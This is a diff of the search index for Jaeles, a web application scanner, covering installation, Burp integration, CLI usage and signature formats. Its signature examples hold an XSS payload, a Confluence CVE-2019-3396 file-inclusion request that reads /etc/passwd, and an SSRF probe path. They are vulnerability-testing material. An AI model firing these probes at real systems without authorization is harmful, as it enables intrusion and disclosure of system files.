@@ -1,80 +1,87 @@
 [
 {
+	"uri": "/signatures/detection/",
+	"title": "Detection",
+	"tags": [],
+	"description": "",
+	"content": " This part will be executed right after Jaeles got response from the request and do a logic for determine the request is vulnerable or not.\nDetections was written in Javascript so you can write whatever you want with some predefind function below as long as you return boolean value to determine it\u0026rsquo;s found something or not.\nExamples Detection # Reponse Status code equal 200 and the reponse body contain a string 'google.com' or 'example.com' StatusCode() == 200 \u0026amp;\u0026amp; (StringSearch(\u0026quot;response\u0026quot;, \u0026quot;google.com\u0026quot;) || StringSearch(\u0026quot;response\u0026quot;, \u0026quot;example.com\u0026quot;)) # Content Length of the response have to greater than original request ContentLength() - OriginContentLength() \u0026gt; 5000 # Response time of the request greater or smaller than original response time Math.abs(ResponeTime() \u0026gt; OriginResponeTime()) \u0026gt; 3  Normal Detection    API Detection Description Example     StringSearch Search string in component StringSearch(\u0026quot;response\u0026quot;, \u0026quot;something\u0026quot;)   RegexSearch Search regex in component RegexSearch(\u0026quot;response\u0026quot;, \u0026quot;.*something$\u0026quot;)   StatusCode Status code of the response StatusCode() == 200, StatusCode() \u0026gt; 400   ResponeTime Response time of the response (second) ResponeTime() \u0026gt; 3   ContentLength Content Length of response ContentLength() \u0026gt; 5000, StatusCode() \u0026gt; 400   OriginStatusCode Status code of the Original response OriginStatusCode() != StatusCode()   OriginResponeTime Response time of the Original response (second) ResponeTime() \u0026gt; OriginResponeTime()   OriginContentLength Content Length of Original response ContentLength() - OriginContentLength() \u0026gt; 5000    Selector for search    API Detection Description Example     request raw request StringSearch(\u0026quot;request\u0026quot;, \u0026quot;something\u0026quot;)   response raw response of the request StringSearch(\u0026quot;response\u0026quot;, \u0026quot;something\u0026quot;)   middleware output of middleware StringSearch(\u0026quot;middleware\u0026quot;, \u0026quot;Success!\u0026quot;)    Special Detection    API Detection Description Example     Collab Grepping collaborator reponse in Reuqest response or Do Real Polling with BurpCollab secret. Collab(\u0026quot;{{.oob}}\u0026quot;)    "
+},
+{
 	"uri": "/introduction/",
 	"title": "Introduction",
 	"tags": [],
 	"description": "",
-	"content": " Custom your Injection point and scan exactly request that you consider potential but also support automatic scan design by you.\nDocumentation Check out Installation Guide to install.\nCheck out Usage Guide to get started.\nScreenshots Signatures \u0026amp; Plugins Easy to extend and customize Signatures.\nSending from Burp Suite.\nContribute Note that this is an alpha version so it may not stable yet and contain bunch of ugly cod and bug that I will refactor later.\nCredits React UI source can be found from this repo.\nAwesome artworks by Freepik at flaticon.com.\nContact @j3ssiejjj\n"
+	"content": " Jaeles is a powerful, flexible and easily extensible framework written in Go which aims to offer a way to build your own Web Application Scanner\nSignatures \u0026amp; Plugins Easy to extend and customize Signatures.\nSending from Burp Suite.\n"
 },
 {
-	"uri": "/plugins/burp-integration/",
+	"uri": "/installation/burp-integration/",
 	"title": "Burp Integration",
 	"tags": [],
 	"description": "",
 	"content": "Get input from Burp\nBurp -\u0026gt; Extender -\u0026gt; Add Jaeles-burp.py as python extensions.\nGet your JWT from this API and fill it into Jaeles Tab in Burp then you\u0026rsquo;re good to go. Click save button if you want to store JWT persistence.\nDefault log will be store in ~/.jaeles-burp/config.json\n "
 },
 {
+	"uri": "/signatures/generator/",
+	"title": "Generator",
+	"tags": [],
+	"description": "",
+	"content": " This part will be executed before parsing request input with the signature for generate variation request base on the original request.\nGenerator    API Generator Description Example     Method Gen request based on method Method(\u0026quot;PUT\u0026quot;) , Method()   Query Gen request based on Query String Query(\u0026quot;{{.original}}{{.payload}}\u0026quot;), Query(\u0026quot;{{.original}}{{.payload}}\u0026quot;, \u0026quot;new\u0026quot;)   Path Gen request based on Path of URL Path(\u0026quot;{{.payload}}\u0026quot;, \u0026quot;ext\u0026quot;)   Body Gen request based on Request Body Body(\u0026quot;{{.original}}{{.payload}}\u0026quot;)   Headers Gen request based on Request Header Header(\u0026quot;{{.original}}{{.payload}}\u0026quot;, \u0026quot;X-Sample\u0026quot;)    Details Method "
+},
+{
 	"uri": "/installation/",
 	"title": "Installation",
 	"tags": [],
 	"description": "",
-	"content": " Jaeles installation Video Guide\nCore Install git clone https://github.com/j3ssie/Jaeles cd Jaeles ./install.sh source jenv/bin/activate  Run Django Application python3 manage.py runserver  Then open your browser at http://127.0.0.1:8000. You gonna need create an user for Web UI access.\npython3 manage.py createsuperuser  After create new user you gonna need default data to get stared. Run default data setup to gen some default data for you.\npython3 scripts/reset.py  Running background task using redis This is not mandatory but it allow to Jaeles to run background task automatically.\nMake sure you have Redis installed or check this install guide if you\u0026rsquo;re on Mac or *nix.\nRun redis server redis-server  Run celery Navigate to Jaeles/jaeles/ then run\ncelery -A jaeles worker -l info  Check out install page on Wiki for more detail.\n"
+	"content": " Jaeles installation Make sure Go installed and simply execute the following command\ngo get -u github.com/j3ssie/jaeles  Inittialize Signature and Web UI This gonna pull latest signature and UI build from default repo.\njaeles config init  "
+},
+{
+	"uri": "/signatures/middleware/",
+	"title": "Middleware",
+	"tags": [],
+	"description": "",
+	"content": "This part will be executed right before request send to the target for doing some extra task before sending a request to target.\n   API Detection Description Example     InvokeCmd Execute Command line and get result of it InvokeCmd(\u0026quot;phuip-fpizdam {{.URL}}\u0026quot;)   Host2IP Turn Host: domain.com header to Host: IP address Host2IP()    "
 },
 {
 	"uri": "/usage/",
 	"title": "Usage",
 	"tags": [],
 	"description": "",
-	"content": " Using with Burp Suite Go to Burp Extender Tab and add python extension from Jaeles/plugins/Jaeles-burp.py to your Burp.\nGet your JWT from this API and fill it into Jaeles Tab in Burp then you\u0026rsquo;re good to go.\nImport Request with proxy mode Navigate to Jaeles/jaeles/extensions then run\nmitmdump -q -p 8779 -s jaeles-mitmproxy.py  Import request from command line\ncurl \u0026quot;http://example.com/listproducts.php?cat=1\u0026quot; --proxy http://\u0026lt;your_bind_interface\u0026gt;:8779 -H 'X-Jaeles: \u0026lt;your_token\u0026gt;'  or just run this if you bind from localhost\ncurl \u0026quot;http://example.com/listproducts.php?cat=1\u0026quot; --proxy http://127.0.0.1:8779  "
+	"content": " Modes  Scan Mode Fuzz Modde\nJaeles - Web Application Scanner Framework v0.3 alpha by @j3ssiejjj Usage: jaeles [command] Available Commands: config Configuration CLI help Help about any command scan Do the Scan server Run server Global Flags: -c, --concurrency int concurrency (default 20) --config string config file (default is $HOME/.jaeles/config.yaml) --debug Debug -h, --help help for jaeles --no-output Do not store raw output -o, --output string output folder name (default \u0026quot;out\u0026quot;) --proxy string proxy --refresh int Refresh (default 10) --retry int retry --rootDir string root Project (default \u0026quot;~/.jaeles/\u0026quot;) --save-raw save raw request --scanID string Scan ID --signDir string signFolder (default \u0026quot;./signatures/\u0026quot;) --timeout int timeout (default 20) -v, --verbose Verbose Use \u0026quot;jaeles [command] --help\u0026quot; for more information about a command.   Scan Scan list of URLs based on signatures Usage: jaeles scan [flags] Flags: -h, --help help for scan -s, --sign string Provide custom header seperate by ';' --ssrf string Fill your BurpCollab -u, --url string URL of target -U, --urls string URLs file of target  Examples Command # scan all signature for single url jaeles scan -u http://example.com # scan phpdebug.yaml signature for list of urls jaeles scan -s signatures/common/phpdebug.yaml -U /tmp/list_of_urls.txt # scan all signatures with \u0026quot;aem\u0026quot; prefix for list of urls jaeles scan --retry 3 --verbose -s \u0026quot;signatures/cves/aem-*\u0026quot; -U /tmp/list_of_urls.txt  Fuzz Start API Server Usage: jaeles server [flags] Flags: -h, --help help for server --host string IP address to bind the server (default \u0026quot;127.0.0.1\u0026quot;) -l, --level int16 Provide custom header seperate by ';' (default 1) --port string Port (default \u0026quot;5000\u0026quot;) -s, --sign string Provide custom header seperate by ';'  Examples Command # scan API server on http://127.0.0.1:5000 jaeles server # scan API server on http://127.0.0.1:5000 with default signature sqli jaeles --verbose server -s sqli  "
 },
 {
-	"uri": "/plugins/",
-	"title": "Plugins",
+	"uri": "/showcases/",
+	"title": "ShowCase",
 	"tags": [],
 	"description": "",
-	"content": " Burp Integration as extension. Persistent Burpcollaborator. "
+	"content": " Single Signature with list of Urls \nFuzzing mode with Burp  "
 },
 {
-	"uri": "/signatures/create-your-first/",
-	"title": "Create Your First",
+	"uri": "/signatures/examples/",
+	"title": "Example Signatures",
 	"tags": [],
 	"description": "",
-	"content": ""
+	"content": " Single signature List signature Fuzz signature "
 },
 {
-	"uri": "/signatures/understand-signatures/",
-	"title": "Understand Signatures",
-	"tags": [],
-	"description": "",
-	"content": ""
-},
-{
-	"uri": "/plugins/persistent-burpcollaborator/",
+	"uri": "/installation/persistent-burpcollaborator/",
 	"title": "Persistent Burpcollaborator",
 	"tags": [],
 	"description": "",
-	"content": " Get Collaborator Secret token Route traffic through proxy\nBurp -\u0026gt; Project Options -\u0026gt; Connections -\u0026gt; Upstream Proxy Server -\u0026gt; then run command below\nmitmdump -q -p 8667 -s burpcollaborator-oob.py  Get burpcollaborator secret\nBurp -\u0026gt; Project Options -\u0026gt; Connections -\u0026gt; Mics -\u0026gt; -\u0026gt; Burp Collaborator Server.\nCheck on Poll over unencrypted HTTP and press run health check many time you want to get secret key\nDefault log will be store in ./collaborator.json\n "
+	"content": " Get Collaborator Secret token Route traffic through proxy\nBurp -\u0026gt; Project Options -\u0026gt; Connections -\u0026gt; Upstream Proxy Server -\u0026gt; then run command below\nmitmdump -q -p 8667 -s burpcollaborator-oob.py  Get burpcollaborator secret\nBurp -\u0026gt; Project Options -\u0026gt; Connections -\u0026gt; Mics -\u0026gt; -\u0026gt; Burp Collaborator Server. Check on Poll over unencrypted HTTP.\nNow open Collaborator Client and click Poll now.\nCopy as many collab as need to be and store it in a file.\nDefault log will be store in ./collaborator.json\n "
 },
 {
 	"uri": "/signatures/",
-	"title": "Signatures",
+	"title": "Understand Signatures",
 	"tags": [],
 	"description": "",
-	"content": " Easy to extend signatures\nNormal Signature \u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt; \u0026lt;PayloadConfigList\u0026gt; \u0026lt;PayloadConfig\u0026gt; \u0026lt;AttackPayload\u0026gt; \u0026lt;Id\u0026gt;XSS_01_1\u0026lt;/Id\u0026gt; \u0026lt;PayloadName\u0026gt;XSS event base\u0026lt;/PayloadName\u0026gt; \u0026lt;PayloadType\u0026gt;XSS\u0026lt;/PayloadType\u0026gt; \u0026lt;OS\u0026gt;General\u0026lt;/OS\u0026gt; \u0026lt;Technology\u0026gt;General\u0026lt;/Technology\u0026gt; \u0026lt;Vulnerability\u0026gt;Cross Site Scripting (XSS)\u0026lt;/Vulnerability\u0026gt; \u0026lt;Description\u0026gt;Event based\u0026lt;/Description\u0026gt; \u0026lt;Risk\u0026gt;High\u0026lt;/Risk\u0026gt; \u0026lt;PayloadString\u0026gt; \u0026lt;![CDATA[%ORIGINAL%'\u0026quot;\u0026gt;\u0026lt;svg/onload=alert(%RANNUM%)\u0026gt;]]\u0026gt; \u0026lt;/PayloadString\u0026gt; \u0026lt;/AttackPayload\u0026gt; \u0026lt;AnalyzeList\u0026gt; \u0026lt;Analyze type=\u0026quot;string\u0026quot;\u0026gt; \u0026lt;AnalyzeString\u0026gt; \u0026lt;![CDATA[\u0026lt;svg/onload=alert(\u0026gt;]]\u0026gt; \u0026lt;/AnalyzeString\u0026gt; \u0026lt;AnalyzeComponent\u0026gt;General\u0026lt;/AnalyzeComponent\u0026gt; \u0026lt;Confidence\u0026gt;Tentative\u0026lt;/Confidence\u0026gt; \u0026lt;/Analyze\u0026gt; \u0026lt;/AnalyzeList\u0026gt; \u0026lt;AnalyzeList\u0026gt; \u0026lt;Analyze type=\u0026quot;regex\u0026quot;\u0026gt; \u0026lt;AnalyzeString\u0026gt; \u0026lt;![CDATA[\\\u0026lt;svg\\/onload\\=alert\\(.*]]\u0026gt; \u0026lt;/AnalyzeString\u0026gt; \u0026lt;AnalyzeComponent\u0026gt;General\u0026lt;/AnalyzeComponent\u0026gt; \u0026lt;Confidence\u0026gt;Tentative\u0026lt;/Confidence\u0026gt; \u0026lt;/Analyze\u0026gt; \u0026lt;/AnalyzeList\u0026gt; \u0026lt;/PayloadConfig\u0026gt; \u0026lt;PayloadConfig\u0026gt; ... \u0026lt;/PayloadConfig\u0026gt; \u0026lt;/PayloadConfigList\u0026gt;  Special Signature \u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt; \u0026lt;PayloadConfigList\u0026gt; \u0026lt;PayloadConfig\u0026gt; \u0026lt;AttackPayload\u0026gt; \u0026lt;Id\u0026gt;CVE_01_1\u0026lt;/Id\u0026gt; \u0026lt;PayloadName\u0026gt;Confluence CVE-2019-3396\u0026lt;/PayloadName\u0026gt; \u0026lt;PayloadType\u0026gt;CVE\u0026lt;/PayloadType\u0026gt; \u0026lt;OS\u0026gt;General\u0026lt;/OS\u0026gt; \u0026lt;Technology\u0026gt;Jira Confluence\u0026lt;/Technology\u0026gt; \u0026lt;Vulnerability\u0026gt;File Inclusion\u0026lt;/Vulnerability\u0026gt; \u0026lt;Description\u0026gt;Confluence CVE-2019-3396\u0026lt;/Description\u0026gt; \u0026lt;Risk\u0026gt;Critical\u0026lt;/Risk\u0026gt; \u0026lt;PayloadString\u0026gt; \u0026lt;![CDATA[%HEADER@Content-Type%|application/xml]]\u0026gt; \u0026lt;/PayloadString\u0026gt; \u0026lt;PayloadString\u0026gt; \u0026lt;![CDATA[%BODY%|{\u0026quot;contentId\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;macro\u0026quot;:{\u0026quot;name\u0026quot;:\u0026quot;widget\u0026quot;,\u0026quot;params\u0026quot;:{\u0026quot;url\u0026quot;:\u0026quot;https://www.viddler.com/v/test\u0026quot;,\u0026quot;width\u0026quot;:\u0026quot;1000\u0026quot;,\u0026quot;height\u0026quot;:\u0026quot;1000\u0026quot;,\u0026quot;_template\u0026quot;:\u0026quot;file:///etc/passwd\u0026quot;},\u0026quot;body\u0026quot;:\u0026quot;\u0026quot;}}]]\u0026gt; \u0026lt;/PayloadString\u0026gt; \u0026lt;/AttackPayload\u0026gt; \u0026lt;AnalyzeList\u0026gt; \u0026lt;Analyze type=\u0026quot;string\u0026quot;\u0026gt; \u0026lt;AnalyzeString\u0026gt; \u0026lt;![CDATA[root:x:0:0:root]]\u0026gt; \u0026lt;/AnalyzeString\u0026gt; \u0026lt;AnalyzeComponent\u0026gt;General\u0026lt;/AnalyzeComponent\u0026gt; \u0026lt;Confidence\u0026gt;Tentative\u0026lt;/Confidence\u0026gt; \u0026lt;/Analyze\u0026gt; \u0026lt;/AnalyzeList\u0026gt; \u0026lt;AnalyzeList\u0026gt; \u0026lt;Analyze type=\u0026quot;string\u0026quot;\u0026gt; \u0026lt;AnalyzeString\u0026gt; \u0026lt;![CDATA[/bin/bash]]\u0026gt; \u0026lt;/AnalyzeString\u0026gt; \u0026lt;AnalyzeComponent\u0026gt;General\u0026lt;/AnalyzeComponent\u0026gt; \u0026lt;Confidence\u0026gt;Tentative\u0026lt;/Confidence\u0026gt; \u0026lt;/Analyze\u0026gt; \u0026lt;/AnalyzeList\u0026gt; \u0026lt;/PayloadConfig\u0026gt; \u0026lt;/PayloadConfigList\u0026gt;  "
-},
-{
-	"uri": "/core/",
-	"title": "Core",
-	"tags": [],
-	"description": "",
-	"content": ""
+	"content": " Each signature basically split in two part and written in YAML format.  Info Request builder  There\u0026rsquo;re 3 types of signature: single, list, fuzz\nInfo Some information about the signature to index in the DB\n# ID to index a signature id: common-01-01 # Type of signature default is \u0026quot;single\u0026quot; type: list # Some info about signature info: name: PHP Debug bar # those feilds below are optional risk: High # default is \u0026quot;Info\u0026quot; tech: general os: general  Request Builder Everything in a signature have template pattern {{.variable}} will be replace to generate request. There\u0026rsquo;re some default template variable: {{.BaseURL}}, {{.URL}}, {{.Host}}, {{.Path}}, {{.Extension}}, {{.oob}}\n# variables only used when signature type is \u0026quot;list\u0026quot; variables: - ssrf: [google.com,example.com] # Each element in requests key will be generate and sending separately requests: - method: GET redirect: true path: \u0026gt;- {{.BaseURL}}/confluence/plugins/servlet/gadgets/makeRequest?url=https://127.0.0.1:443@{{.ssrf}} headers: - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0 - X-Atlassian-Token: no-check detections: - \u0026gt;- StatusCode() == 200 \u0026amp;\u0026amp; (StringSearch(\u0026quot;response\u0026quot;, \u0026quot;google.com\u0026quot;) || StringSearch(\u0026quot;response\u0026quot;, \u0026quot;example.com\u0026quot;))  More advanced request builder\nrequests: - method: GET redirect: true detections: - \u0026gt;- StatusCode() == 200 \u0026amp;\u0026amp; (StringSearch(\u0026quot;response\u0026quot;, \u0026quot;google.com\u0026quot;) || StringSearch(\u0026quot;response\u0026quot;, \u0026quot;example.com\u0026quot;)) # Request raw (make sure you're using \u0026quot;|\u0026quot; in this raw key) raw: | POST /search.php?test=query HTTP/1.1 Host: {{.Host}} Content-Length: 25 Cache-Control: max-age=0 Origin: http://{{.Host}} Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3927.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Referer: http://{{.Host}}/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close  With Origin request\norigin: method: GET redirect: true path: \u0026gt;- {{.BaseURL}}/404 requests: - method: GET redirect: true # use template header in case you're not define it use_template_header: false path: \u0026gt;- {{.BaseURL}}/.perf detections: - \u0026gt;- StatusCode() == 200 \u0026amp;\u0026amp; StringSearch(\u0026quot;response\u0026quot;, \u0026quot;Oracle iPlanet Web Server\u0026quot;) \u0026amp;\u0026amp; StringSearch(\u0026quot;response\u0026quot;, \u0026quot;ConnectionQueue\u0026quot;)  [Optional] Reference This is just a reference info\nreference: - link: https://jira.atlassian.com/browse/JRASERVER-70018  "
 },
 {
 	"uri": "/",
 	"title": "Home",
 	"tags": [],
 	"description": "",
-	"content": "Web Application Scanner Framework for Expert This is just documentation full release will comming soon!\n "
+	"content": "Jaeles is a powerful, flexible and easily extensible framework written in Go for building your own Web Application Scanner. Overview    Page Description     Installation Guide to Installation   Usage Guide to basic usage   Demo Some showcases   Understand Signature Understand Signature    "
 },
 {
 	"uri": "/categories/",
